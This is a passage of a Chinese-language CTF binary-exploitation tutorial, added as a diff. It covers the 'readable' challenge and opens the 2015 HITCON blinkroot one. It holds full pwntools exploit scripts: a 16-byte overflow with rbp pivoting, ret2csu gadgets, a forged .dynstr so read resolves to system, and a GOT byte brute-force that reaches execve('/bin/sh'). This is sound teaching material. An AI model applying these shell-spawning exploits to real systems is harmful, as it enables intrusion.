@@ -1,0 +1,235 @@
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+也就是说我们其实可以直接修改 dynamic 节的内容。但是，与 2015-xdctf-pwn200 不同，这里栈溢出只能越界读取 16 个字节，而上述例子中所使用的的 ret2csu 则需要大量的字节。因此，直接使用该方法是不行了。
+我们来仔细分析下目前的情况，即我们可以越界控制 rbp、返回地址。考虑到 read 是使用 rbp 来索引 buffer 的
+```
+.text:0000000000400505                 lea     rax, [rbp-10h]
+.text:0000000000400509                 mov     edx, 20h ; ' '  ; nbytes
+.text:000000000040050E                 mov     rsi, rax        ; buf
+.text:0000000000400511                 mov     edi, 0          ; fd
+.text:0000000000400516                 mov     eax, 0
+.text:000000000040051B                 call    _read
+.text:0000000000400520                 leave
+.text:0000000000400521                 retn
+```
+那如果我们控制 rbp 为写的地址加上 0x10，即 targetaddr+0x10，然后再跳转到 0x400505，即栈的结构为
+```
+return_addr -> 0x400505
+rbp         -> target addr + 0x10
+fake buf
+```
+那么我们就可以控制程序在目标地址处写 16 个字节。通过不断地这样操作，我们就可以不断地读取 16 个字节，从而达到读取任意长字节的目的。
+### 方法1：modify dynamic section
+```python
+from pwn import *
+# context.log_level="debug"
+context.terminal = ["tmux","splitw","-h"]
+context.arch="amd64"
+io = process("./readable")
+rop = ROP("./readable")
+elf = ELF("./readable")
+bss_addr = elf.bss()
+csu_first_addr = 0x40058A
+csu_second_addr = 0x400570
+def csu_gadget(rbx, rbp, func_ptr, edi, rsi, rdx):
+    # rdx = r13
+    # rsi = r14
+    # rdi = r15d
+    # call [r12+rbx*8]
+    # set rbx+1=rbp
+    return flat([csu_first_addr, rbx, rbp, func_ptr, rdx,
+                    rsi, edi, csu_second_addr], arch="amd64")+'a' * 0x38
+def read16bytes(targetaddr, content):
+    payload = 'a'*16
+    payload += p64(targetaddr+0x10)
+    payload += p64(0x400505)
+    payload += content.ljust(16, "\x00")
+    payload += p64(0x600890)
+    payload += p64(0x400505)
+    return payload
+# stack privot to bss segment, set rsp = new_stack
+fake_data_addr = bss_addr
+new_stack = bss_addr+0x500
+# modify .dynstr pointer in .dynamic section to a specific location
+rop = csu_gadget(0, 1 ,elf.got['read'],0,0x600778+8,8)
+# construct a fake dynstr section
+dynstr = elf.get_section_by_name('.dynstr').data()
+dynstr = dynstr.replace("read","system")
+rop += csu_gadget(0, 1 ,elf.got['read'],0,fake_data_addr,len(dynstr))
+# read /bin/sh\x00
+binsh_addr = fake_data_addr+len(dynstr)
+rop += csu_gadget(0, 1 ,elf.got['read'],0,binsh_addr,len("/bin/sh\x00"))
+# 0x0000000000400593: pop rdi; ret; 
+rop +=p64(0x0000000000400593)+p64(binsh_addr)
+# 0x0000000000400590: pop r14; pop r15; ret; 
+rop +=p64(0x0000000000400590) +'a'*16 # stack align
+# return to the second instruction of read'plt
+rop +=p64(0x4003E6)
+# gdb.attach(io)
+# pause()
+for i in range(0,len(rop),16):
+    tmp = read16bytes(new_stack+i,rop[i:i+16])
+    io.send(tmp)
+# jump to the rop
+payload = 'a'*16
+payload += p64(new_stack-8)
+payload += p64(0x400520)  # leave ret
+io.send(payload)
+# send fake dynstr addr
+io.send(p64(fake_data_addr))
+# send fake dynstr section
+io.send(dynstr)
+# send "/bin/sh\x00"
+io.send("/bin/sh\x00")
+io.interactive()
+```
+### 方法 2 - 标准 ROP
+这个方法比较取巧，考虑到 read 函数很短，而且最后会调用系统调用，因此在 libc 的实现中会使用 syscall 指令，而同时我们可以修改 read 的 got 表，那如果我们把 PI:EMAIL 修改为 syscall 的地址，同时布置好相关的参数，即可执行系统调用。这里我们控制 ROP 执行`execve("/bin/sh",NULL,NULL)`。
+首先，我们需要爆破来寻找 syscall 具体的地址，我们可以考虑调用 write 函数来看是否真正执行了 syscall指令
+```
+def bruteforce():
+    rop_addr = elf.bss()
+    for i in range(0, 256):
+        io = process("./readable")
+        # modify read's got
+        payload = csu_gadget(0, 1, elf.got["read"], 1, elf.got["read"], 0)
+        # jump to read again
+        # try to write ELF Header to stdout
+        payload += csu_gadget(0, 1, elf.got["read"], 4, 0x400000, 1)
+        # gdb.attach(io)
+        # pause()
+        for j in range(0, len(payload), 16):
+            tmp = read16bytes(rop_addr+j, payload[j:j+16])
+            io.send(tmp)
+        # jump to the rop
+        payload = 'a'*16
+        payload += p64(rop_addr-8)
+        payload += p64(0x400520)  # leave ret
+        io.send(payload)
+        io.send(p8(i))
+        try:
+            data = io.recv(timeout=0.5)
+            if data == "\x7FELF":
+                print(hex(i), data)
+        except Exception as e:
+            pass
+        io.close()
+```
+即我们控制程序输出 ELF 文件的头，如果输出了，那就说明成功了。此外，这里我们使用了read 函数的返回值来控制 rax 寄存器的值，以便于控制具体想要执行哪个系统调用。运行结果如下
+```bash
+❯ python exp.py
+('0x8f', '\x7fELF')
+('0xc2', '\x7fELF')
+```
+通过对比 libc.so 确实可以看到，对应的偏移处具有 `syscall` 指令
+```
+.text:000000000011018F                 syscall                 ; LINUX - sys_read
+.text:00000000001101C2                 syscall                 ; LINUX - sys_read
+```
+libc 的版本为
+```
+❯ ./libc.so.6
+GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
+```
+需要注意，不同 libc 的偏移可能不一样。
+完整代码如下
+```python
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+context.log_level = 'error'
+elf = ELF("./readable")
+csu_first_addr = 0x40058A
+csu_second_addr = 0x400570
+def read16bytes(targetaddr, content):
+    payload = 'a'*16
+    payload += p64(targetaddr+0x10)
+    payload += p64(0x400505)
+    payload += content.ljust(16, "\x00")
+    payload += p64(0x600f00)
+    payload += p64(0x400505)
+    return payload
+def csu_gadget(rbx, rbp, r12, r13, r14, r15):
+    # rdx = r13
+    # rsi = r14
+    # rdi = r15d
+    # call [r12+rbx*8]
+    # set rbx+1=rbp
+    payload = flat([csu_first_addr, rbx, rbp, r12, r13,
+                    r14, r15, csu_second_addr], arch="amd64")
+    return payload
+def bruteforce():
+    rop_addr = elf.bss()
+    for i in range(0, 256):
+        io = process("./readable")
+        # modify read's got
+        payload = csu_gadget(0, 1, elf.got["read"], 1, elf.got["read"], 0)
+        # jump to read again
+        # try to write ELF Header to stdout
+        payload += csu_gadget(0, 1, elf.got["read"], 4, 0x400000, 1)
+        # gdb.attach(io)
+        # pause()
+        for j in range(0, len(payload), 16):
+            tmp = read16bytes(rop_addr+j, payload[j:j+16])
+            io.send(tmp)
+        # jump to the rop
+        payload = 'a'*16
+        payload += p64(rop_addr-8)
+        payload += p64(0x400520)  # leave ret
+        io.send(payload)
+        io.send(p8(i))
+        try:
+            data = io.recv(timeout=0.5)
+            if data == "\x7FELF":
+                print(hex(i), data)
+        except Exception as e:
+            pass
+        io.close()
+def exp():
+    rop_addr = elf.bss()
+    io = process("./readable")
+    execve_number = 59
+    bin_sh_addr = elf.got["read"]-execve_number+1
+    # modify the last byte of read's got
+    payload = csu_gadget(0, 1, elf.got["read"], execve_number, bin_sh_addr, 0)
+    # jump to read again, execve("/bin/sh\x00")
+    payload += csu_gadget(0, 1, elf.got["read"],
+                          bin_sh_addr+8, bin_sh_addr+8, bin_sh_addr)
+    for j in range(0, len(payload), 16):
+        tmp = read16bytes(rop_addr+j, payload[j:j+16])
+        io.send(tmp)
+    # jump to the rop
+    payload = 'a'*16
+    payload += p64(rop_addr-8)
+    payload += p64(0x400520)  # leave ret
+    io.send(payload)
+    payload = '/bin/sh'.ljust(execve_number-1, '\x00')+p8(0xc2)
+    io.send(payload)
+    io.interactive()
+if __name__ == "__main__":
+    # bruteforce()
+    exp()
+```
+## 2015-hitcon-quals-blinkroot
+简单看一下程序开的保护
+```bash
+❯ checksec blinkroot
+[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-hitcon-quals-blinkroot/blinkroot'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+发现程序开启了 Canary 保护。
+程序的基本逻辑为
+- 在 bss 指定位置处读取 1024 个字节
+- 关闭标准输入，标准输出，标准错误输出。
+- 然后可以在任意 16 字节对齐地址处设置16个字节，其中低8字节固定为 0x10，高 8 字节完全可控。
+显然这里是没有信息泄露的，当然我们没有办法覆盖返回地址来控制程序的执行流。但是既然程序没有开启 RELRO 保护，我们可以考虑修改 ELF 文件的字符串表。同时我们观察到
+```c
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  if ( recvlen(0, (char *)&data, 0x400uLL) == 1024 )
+  {
